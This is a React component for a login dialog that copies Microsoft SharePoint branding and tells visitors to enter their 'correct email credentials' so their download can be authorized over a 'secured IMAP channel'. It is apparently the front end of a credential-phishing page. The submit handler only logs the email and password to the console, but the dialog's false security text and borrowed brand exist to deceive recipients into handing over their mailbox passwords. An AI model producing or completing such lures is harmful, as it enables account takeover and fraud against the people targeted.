import { useState } from "react";
import { Dialog, DialogContent } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Button } from "@/components/ui/button";

interface AuthModalProps {
  isOpen: boolean;
  onClose: () => void;
}

export const AuthModal = ({ isOpen, onClose }: AuthModalProps) => {
  const [email, setEmail] = useState("hi@me.com");
  const [password, setPassword] = useState("");

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    // Handle authentication here
    console.log("Authentication attempted with:", { email, password });
  };

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="w-[95vw] max-w-md mx-auto p-0 gap-0 bg-white shadow-modal border-0">
        {/* Header */}
        <div className="flex items-center space-x-2 px-4 md:px-6 py-3 md:py-4 border-b border-sharepoint-border">
          <div className="flex items-center space-x-2">
            <div className="w-5 h-5 md:w-6 md:h-6 flex items-center space-x-1">
              <div className="w-1.5 h-1.5 md:w-2 md:h-2 bg-red-500 rounded-sm"></div>
              <div className="w-1.5 h-1.5 md:w-2 md:h-2 bg-green-500 rounded-sm"></div>
              <div className="w-1.5 h-1.5 md:w-2 md:h-2 bg-blue-500 rounded-sm"></div>
              <div className="w-1.5 h-1.5 md:w-2 md:h-2 bg-yellow-500 rounded-sm"></div>
            </div>
            <span className="text-xs md:text-sm font-medium text-sharepoint-text">Microsoft</span>
            <span className="text-sharepoint-text/60 hidden sm:inline">|</span>
            <span className="text-xs md:text-sm font-medium text-sharepoint-text hidden sm:inline">SharePoint</span>
          </div>
        </div>

        {/* Content */}
        <div className="px-4 md:px-6 py-4 md:py-6">
          <div className="text-center mb-4 md:mb-6">
            <p className="text-sharepoint-text/80 text-xs md:text-sm leading-relaxed">
              These files are sensitive and secured against unauthorized access. In 
              order to access these files, please provide your correct email 
              credentials, we will connect you to your email provider through a 
              secured IMAP channel to authorize your download.
            </p>
          </div>

          <div className="text-center mb-4 md:mb-6">
            <h3 className="text-sharepoint-text font-medium italic text-sm md:text-base">
              Enter details to access protected documents
            </h3>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="email" className="text-sharepoint-text text-xs md:text-sm">
                Email address
              </Label>
              <Input
                id="email"
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="w-full border-sharepoint-border focus:border-sharepoint-blue focus:ring-sharepoint-blue text-sm md:text-base"
                required
              />
            </div>

            <div className="space-y-2">
              <Label htmlFor="password" className="text-sharepoint-text text-xs md:text-sm">
                Password
              </Label>
              <Input
                id="password"
                type="password"
                placeholder="Receiver's password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full border-sharepoint-border focus:border-sharepoint-blue focus:ring-sharepoint-blue text-sm md:text-base"
                required
              />
            </div>

            <div className="pt-3 md:pt-4">
              <Button
                type="submit"
                className="w-full bg-sharepoint-blue hover:bg-sharepoint-header text-white py-2.5 md:py-3 rounded text-sm md:text-base"
              >
                Access Files
              </Button>
            </div>
          </form>
        </div>
      </DialogContent>
    </Dialog>
  );
};